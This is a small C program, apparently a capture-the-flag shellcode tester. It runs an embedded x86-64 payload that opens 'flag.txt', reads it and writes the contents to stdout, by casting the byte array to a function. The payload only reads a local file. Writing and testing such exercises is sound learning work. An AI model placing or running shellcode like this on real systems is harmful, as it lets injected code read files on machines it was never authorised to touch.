#include <string.h>
#include <stdio.h>

char shellcode[] = "\xcc\x68\x66\x6c\x61\x67\x48\x83\xc4\x0c\x68\x2e\x74\x78\x74\x48\x83\xec\x04\x48\x31\xc0\x04\x02\x48\x31\xf6\x48\x89\xe7\x0f\x05\x66\x81\xec\xff\x0f\x48\x89\xc7\x48\x31\xd2\x66\xba\x00\x01\x48\x89\xe6\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05";

int main(){
    printf("len: %d bytes\n", strlen(shellcode));
    (*(void (*)()) shellcode)();
    return 0;
}
